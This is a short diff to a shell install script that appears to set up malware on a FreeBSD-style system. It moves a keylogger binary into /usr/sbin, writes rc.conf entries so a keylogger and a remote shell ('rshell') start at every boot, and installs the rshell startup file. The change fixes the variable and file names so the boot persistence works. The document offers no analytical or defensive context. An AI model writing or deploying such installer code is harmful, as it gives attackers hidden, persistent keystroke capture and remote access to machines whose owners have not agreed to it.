@@ -84,10 +84,10 @@ echo ">> Moving keylog binary into /usr/sbin/ for booting."
 mv -f $BINARIES/$KEYLOG $USR_SBIN
 
 echo ">> Modify rc.conf to enable boot for rshell."
-echo "${RSHELL}_enable=\"YES\"" >> $RSHELL_CONF_FILE
+echo "${RSHELL_CONF_FILE}_enable=\"YES\"" >> $RC_CONF_FILE
 
 echo ">> Modify rc.conf to enable boot for keylog."
-echo "${KEYLOG}_enable=\"YES\"" >> $RSHELL_CONF_FILE
+echo "${KEYLOG_CONF_FILE}_enable=\"YES\"" >> $RC_CONF_FILE
 
 echo ">> Move rshell configuration file into /etc/rc.d."
 mv $BINARIES/$RSHELL_CONF_FILE $RC_INSTALL_LOCATION
